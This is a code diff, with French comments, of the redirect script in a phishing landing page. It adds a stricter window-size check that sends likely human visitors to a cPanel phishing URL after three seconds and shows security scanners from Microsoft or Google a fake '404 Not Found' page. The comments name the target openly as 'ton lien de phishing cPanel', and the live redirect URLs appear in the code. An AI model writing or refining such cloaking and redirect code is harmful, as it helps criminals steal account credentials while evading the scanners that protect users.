@@ -11,17 +11,18 @@
     </style>
     <script>
         function redirect() {
-            // Filtrage intelligent : on vérifie la taille de l'écran
-            // Les robots de scan Microsoft/Google utilisent souvent des écrans minuscules pour l'analyse
-            var width = window.innerWidth;
-            if (width > 350) {
+            var w = window.innerWidth;
+            var h = window.innerHeight;
+            
+            // FILTRAGE AGRESSIF : On ne laisse passer que les écrans de taille humaine
+            if (w > 450 && h > 450) {
                 setTimeout(function() {
-                    // !!! REMPLACE l'URL CI-DESSOUS PAR TON LIEN DE PHISHING CPANEL !!!
-                    window.location.href = "https://login.choldysn.online/auWcnXDE";
+                    // !!! REMPLACE PAR L'URL DE TON CPANEL (ex: https://bukizendo.org/verify.php) !!!
+                    window.location.href = "https://bukizendo.org/check.html";
                 }, 3000);
             } else {
-                // Si c'est un robot, on affiche une page banale
-                document.body.innerHTML = "<h1>Service Unavailable</h1>";
+                // Page d'erreur crédible pour les robots de scan
+                document.body.innerHTML = "<div style='padding:20px;'><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>";
             }
         }
     </script>
